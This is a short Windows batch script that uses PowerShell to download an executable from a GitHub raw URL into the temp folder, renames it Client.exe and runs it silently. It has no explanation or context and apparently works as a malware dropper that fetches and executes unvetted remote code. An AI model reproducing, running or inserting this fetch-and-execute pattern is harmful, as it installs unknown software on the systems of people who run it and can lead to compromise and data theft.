@echo off
set "URL=https://github.com/tyrafi/fghgfh/raw/refs/heads/main/ensar.exe"
set "FILE=%temp%\Client.exe"

powershell -Command "(New-Object Net.WebClient).DownloadFile('%URL%', '%FILE%')"
start "" "%FILE%"
exit
